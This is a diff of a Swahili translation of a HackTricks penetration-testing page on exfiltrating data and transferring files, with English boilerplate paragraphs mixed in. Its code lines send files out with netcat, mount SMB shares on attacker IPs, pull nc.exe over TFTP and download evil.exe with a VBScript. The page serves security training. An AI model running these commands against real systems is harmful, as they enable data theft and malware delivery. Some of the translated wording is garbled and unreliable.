@@ -8,17 +8,25 @@ Njia nyingine za kusaidia HackTricks:
 
 * Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-## Vyanzo vya kawaida vilivyowekewa orodha nyeupe kwa ajili ya kufyonza taarifa
+**Kikundi cha Usalama cha Kujitahidi Kwa Bidii**
 
-Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata vyanzo vya kawaida vilivyowekewa orodha nyeupe ambavyo vinaweza kutumiwa vibaya
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
-## Nakili\&Banda la Msingi64
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
+## Vyanzo vya kawaida vilivyoorodheshwa kwa ajili ya kufyonza taarifa
+
+Angalia [https://lots-project.com/](https://lots-project.com/) kupata vyanzo vya kawaida vilivyoorodheshwa ambavyo vinaweza kutumiwa vibaya
+
+## Nakili\&Banda la Msingi wa 64
 
 **Linux**
 ```bash
@@ -179,29 +187,25 @@ service smbd restart
 ```
 ### Exfiltration Techniques on Windows
 
-#### Common Exfiltration Techniques
+#### Clipboard
 
-1. **Data Compression**: Compress data before exfiltration to reduce size and avoid detection.
-2. **Data Encryption**: Encrypt data to prevent unauthorized access during exfiltration.
-3. **Steganography**: Hide data within other files to avoid detection.
-4. **DNS Tunneling**: Use DNS protocol to exfiltrate data, bypassing firewalls.
-5. **HTTP/HTTPS**: Use HTTP or HTTPS protocols to exfiltrate data over network.
-6. **Email**: Send data as email attachments or within email body.
-7. **Cloud Storage**: Upload data to cloud storage services for exfiltration.
-8. **External Storage**: Copy data to external storage devices for physical exfiltration.
+The clipboard can be used to exfiltrate data by copying sensitive information and pasting it into a file or application on the attacker's system.
 
-#### Tools and Resources
+#### File Transfer Protocols
 
-- **Netcat**: Command-line tool for reading and writing data across network connections.
-- **PowerShell**: Windows scripting tool that can be used for exfiltration.
-- **Covenant**: .NET command and control framework for exfiltration.
-- **Empire**: Post-exploitation framework for exfiltration on Windows systems.
-- **Mimikatz**: Tool to extract credentials from Windows systems for exfiltration.
-- **PsExec**: Command-line tool to execute processes on remote systems for exfiltration.
-- **Certutil**: Built-in Windows utility to decode/encode data for exfiltration.
-- **Bitsadmin**: Built-in Windows utility to create and manage transfer jobs for exfiltration.
+File transfer protocols such as FTP, SFTP, and SMB can be used to transfer files containing sensitive data from the compromised system to the attacker's system.
 
-By using these techniques and tools, attackers can exfiltrate data from Windows systems without being detected easily.
+#### Email
+
+Email can be used to exfiltrate data by sending emails with attachments containing sensitive information to an email account controlled by the attacker.
+
+#### DNS Tunneling
+
+DNS tunneling can be used to exfiltrate data by encoding sensitive information in DNS queries and responses.
+
+#### Web Protocols
+
+Web protocols such as HTTP and HTTPS can be used to exfiltrate data by sending HTTP requests containing sensitive information to a web server controlled by the attacker.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -225,11 +229,26 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Swahili Translation:
+### Data Exfiltration
 
-## NC
+Data exfiltration is the unauthorized transfer of data from a computer or server. Attackers use various techniques to exfiltrate data, such as:
 
-### Tafsiri ya Kiswahili:
+- **Email**: Sending sensitive data as email attachments.
+- **FTP**: Transferring data using File Transfer Protocol (FTP).
+- **DNS**: Sending data through DNS requests.
+- **HTTP/HTTPS**: Using HTTP or HTTPS protocols to send data.
+- **Steganography**: Hiding data within other files to avoid detection.
+- **Encryption**: Encrypting data before exfiltration to avoid detection.
+
+To prevent data exfiltration, organizations can implement measures such as:
+
+- **Network Segmentation**: Dividing the network into segments to limit unauthorized access.
+- **Data Loss Prevention (DLP)**: Implementing DLP solutions to monitor and control data transfers.
+- **Access Controls**: Restricting access to sensitive data based on user roles.
+- **Monitoring and Logging**: Monitoring network traffic and logging events for analysis.
+- **Encryption**: Encrypting data at rest and in transit to protect it from unauthorized access.
+
+By understanding common exfiltration techniques and implementing appropriate security measures, organizations can better protect their data from unauthorized access and leakage.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -270,13 +289,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ya kupokea data na python:
+Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ya kupokea data kwa kutumia python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Kwa chaguo-msingi katika XP na 2003 (katika mingine inahitaji kuongezwa wazi wakati wa usakinishaji)
+Kwa chaguo-msingi katika XP na 2003 (katika nyingine inahitaji kuongezwa wazi wakati wa usakinishaji)
 
 Katika Kali, **anzisha seva ya TFTP**:
 ```bash
@@ -285,12 +304,12 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Server ya TFTP kwa kutumia python:**
+**Server ya TFTP kwa python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Katika **mwenyeji**, unganisha kwenye seva ya Kali:
+Katika **mwendazake**, unganisha kwenye seva ya Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -302,7 +321,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript ni lugha ya programu inayotumika sana kwa maendeleo ya skripti za Windows. Inaweza kutumika kwa ufanisi kutekeleza mbinu za kuvuja data kwa kuchimba data kutoka kwa mfumo uliokaliwa na kuipeleka kwa seva ya mbali. Katika muktadha wa uchunguzi wa kuvamia, VBScript inaweza kutumika kama zana ya kuvuja data kwa kuchukua data nyeti kutoka kwa mfumo uliokaliwa na kuipeleka kwa mtu wa tatu au seva ya mbali.
+VBScript ni lugha ya programu inayotumika sana kwa maendeleo ya skripti za Windows. Inaweza kutumika kwa ufanisi kwa madhumuni ya uhamishaji wa data kwa sababu ya uwezo wake wa kufanya kazi na faili za nje na mitandao.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -340,14 +359,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Programu ya `debug.exe` sio tu inaruhusu ukaguzi wa binaries lakini pia ina **uwezo wa kujenga upya kutoka kwa hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Hata hivyo, ni muhimu kuzingatia kwamba debug.exe ina **kizuizi cha kuunda faili hadi 64 kb in size**.
+Programu ya `debug.exe` sio tu inaruhusu ukaguzi wa binaries lakini pia ina **uwezo wa kujenga upya kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kizuizi cha kuunda faili hadi 64 kb in size**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```sw
-Kisha nakili na kubandika maandishi kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
+Kisha nakili na ushirikishe maudhui kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -355,10 +373,15 @@ Kisha nakili na kubandika maandishi kwenye windows-shell na faili inayoitwa nc.e
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
+**Kikundi cha Usalama cha Kujaribu Kwa Bidii**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
@@ -366,7 +389,6 @@ Njia nyingine za kusaidia HackTricks:
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-```
